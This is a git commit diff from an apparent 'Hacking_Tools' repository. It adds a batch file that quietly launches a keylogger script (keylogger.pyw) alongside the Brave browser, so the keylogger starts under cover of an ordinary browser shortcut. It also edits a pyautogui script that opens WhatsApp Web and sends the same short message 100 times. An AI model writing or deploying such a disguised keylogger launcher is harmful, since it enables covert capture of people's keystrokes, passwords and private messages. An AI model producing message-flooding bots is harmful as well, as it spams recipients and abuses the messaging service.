32d4635d1d24c316506a0018b79def695cbe3bcc
Ricky4K <69011572+Ricky4K@users.noreply.github.com>
2022-11-21 13:37:15 +0100

    ADD

---
+++ Keylogger/startup - Kopie.bat
@@ -0,0 +1,3 @@
+@echo off
+start "" "D:\Github\Hacking_Tools\Keylogger\keylogger.pyw"
+start "" "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
--- WAS/main.py
+++ WAS/main.py
@@ -5,6 +5,8 @@ import time
 wb.open("web.whatsapp.com")
 time.sleep(30)
 for i in range(100):
-    pyautogui.press(":")
-    pyautogui.press("D")
+    pyautogui.press("i")
+    pyautogui.press("n")
+    pyautogui.press("d")
+    pyautogui.press("y")
     pyautogui.press("enter")
